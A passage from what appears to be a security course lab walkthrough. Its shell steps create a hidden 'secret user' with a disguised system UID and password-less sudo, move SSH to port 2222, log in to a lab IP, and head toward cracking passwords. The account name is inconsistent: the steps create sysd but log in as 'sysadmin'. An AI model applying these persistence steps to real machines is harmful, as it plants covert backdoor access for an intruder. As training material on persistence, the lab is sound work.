2. Give your secret user a password:
passwd sysd

3. Give your secret user a system UID < 1000:
usermod -u 777 sysd

4. Give your secret user the same GID:
groupmod -g 777 sysd

5. Give your secret user full sudo access without the need for a password:
usermod -aG sudo sysd

6. Test that sudo access works without your password:
sudo -l

Step 2: Smooth Sailing
nano /etc/ssh/sshd_config
Port 2222

Step 3: Testing Your Configuration Update
systemctl restart ssh

2. Exit the root account:
exit

3. SSH to the target machine using your sysd account and port 2222:
ssh sysadmin@192.168.6.105 -p 2222

4. Use sudo to switch to the root user:
sudo su


Step 4: Crack All the Passwords
SSH back to the system using your sysd account and port 2222:
ssh sysadmin@192.168.6.105 -p 2222
